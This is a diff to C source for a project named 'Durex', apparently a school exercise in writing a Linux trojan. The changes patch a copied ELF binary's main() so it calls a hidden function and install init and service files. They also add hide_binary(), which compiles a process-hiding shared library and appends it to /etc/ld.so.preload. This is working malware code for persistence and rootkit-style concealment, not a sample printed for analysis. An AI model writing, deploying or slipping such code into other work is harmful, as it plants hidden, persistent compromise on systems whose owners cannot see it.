@@ -6,7 +6,7 @@
 /*   By: root </var/mail/root>                      +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2018/07/15 02:21:05 by root              #+#    #+#             */
-/*   Updated: 2018/08/05 20:28:25 by root             ###   ########.fr       */
+/*   Updated: 2018/08/06 19:57:35 by root             ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -27,6 +27,9 @@ static int	install_error(int fd)
 	remove(DUREX_SERVICE_FILE);
 	remove(DUREX_CONF_FILE);
 	remove(DUREX_INIT_FILE);
+	remove(DUREX_PROCESSHIDER_FIL);
+	remove(DUREX_PROCESSHIDER_LIB);
+	remove(DUREX_PRELOAD);
 	system("mpg123 audio/Slap.mp3 2>/dev/null");
 	return 1;
 }
@@ -38,6 +41,7 @@ static void	modify_binary(void *data)
 	Elf64_Off	mainoff;
 	Elf64_Off	durexoff;
 
+	// Here we retreive the offset of the main and durex functions in the binary.
 	for (size_t i = 0; i < hdr->e_shnum; i++) {
 		if (shd[i].sh_type == SHT_SYMTAB || shd[i].sh_type == SHT_DYNSYM) {
 			Elf64_Shdr	*symbol_assoc = shd + shd[i].sh_link;
@@ -57,15 +61,16 @@ static void	modify_binary(void *data)
 			}
 		}
 	}
+	// Now we search for a 'call ...' opcode in the main to replace with another function
 	u_char		*ptr = (u_char *)(data + mainoff); // Begining of "main"
 	int			off = 5; // opcode length of "callq [offset]" is "e8 00 00 00 00" = 5
 	while (*ptr++ != 0xe8)  // Call opcode
-		off++;
-	off = durexoff - ( mainoff + off );
-	memcpy(ptr, &off, 4);
+		off++; // Compute offset from main to the first call found
+	off = durexoff - ( mainoff + off ); // Offset from main() + offset to durex()
+	memcpy(ptr, &off, 4); // Change the call of the first function in the main with durex().
 }
 
-int			install_binary(const char *prog)
+int			install_binary()
 {
 	int		durex;
 	int		bin;
@@ -75,7 +80,7 @@ int			install_binary(const char *prog)
 	bin = open(DUREX_BINARY_FILE, O_CREAT | O_EXCL | O_WRONLY, 0755);
 	if (bin < 0)
 		return install_error(bin);
-	if ((durex = open(prog, O_RDONLY)) == -1)
+	if ((durex = open(e.prog, O_RDONLY)) == -1)
 		return install_error(bin);
 	size = lseek(durex, 1, SEEK_END);
 	data = mmap(NULL, size, PROT_READ | PROT_WRITE, MAP_PRIVATE, durex, 0);
@@ -133,6 +138,24 @@ int			install_init()
 	close(fd);
 	if (ret != sizeof(DUREX_INIT_SCRIPT))
 		return install_error(-1);
-	system(DUREX_ACTIVATE_SCRIPT);
+	system(DUREX_ACTIVATE);
+	return 0;
+}
+
+int			hide_binary()
+{
+	int		fd;
+	size_t	ret;
+
+	fd = open(DUREX_PROCESSHIDER_FIL, O_CREAT | O_TRUNC | O_WRONLY, 0644);
+	if (fd < 0)
+		return install_error(fd);
+	ret = write(fd, DUREX_PROCESSHIDER_SCR, sizeof(DUREX_PROCESSHIDER_SCR) - 1);
+	close(fd);
+	if (ret != sizeof(DUREX_PROCESSHIDER_SCR) - 1)
+		return install_error(-1);
+	system("gcc -Wall -fPIC -shared -o /usr/local/lib/Durex.so processhider.c -ldl");
+	system("echo /usr/local/lib/Durex.so >> /etc/ld.so.preload");
+	remove(DUREX_PROCESSHIDER_FIL);
 	return 0;
 }
